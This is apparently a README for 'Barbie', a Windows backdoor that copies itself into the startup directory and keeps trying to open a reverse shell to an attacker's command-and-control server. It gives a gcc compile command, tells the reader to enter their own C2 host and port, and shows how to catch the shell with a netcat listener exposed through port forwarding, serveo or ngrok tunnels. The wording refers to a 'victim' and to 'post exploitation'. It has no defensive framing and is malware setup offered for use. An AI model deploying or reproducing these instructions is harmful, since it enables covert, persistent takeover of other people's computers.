# Barbie
A simple, persisent windows toy backdoor spawning a reverse shell.

Once the victim starts the executable it locates itself on default startup programs directory,<br>then it tries to connect to establish a connection every 30 seconds.
## Setup
Edit the 8 and 9 lines with your own C2 server and port.
#### Compile
`gcc barbie.c -o startupsrvc -w -lws2_32 -mwindows`
#### Setting up your machine as a momentary C2 server
1) First start a TCP listener on your localhost for incoming connections.<br>
With netcat: `nc -lvnp <PORT>`
2) Now you have to expose your localhost on the internet, there are various methods to do this:
   * Setting up port forwarding by opening the choosen port on your modem router
   * Using [serveo](https://serveo.net) to start a SSH tunnel: `ssh -R <SERVEO PORT>:localhost:<PORT> serveo.net`
   * Using [ngrok](https://ngrok.com) to start a TCP tunnel: `ngrok tcp <PORT>`
### Post exploitation
[Here](https://www.google.com/search?q=windows+post+exploitation)
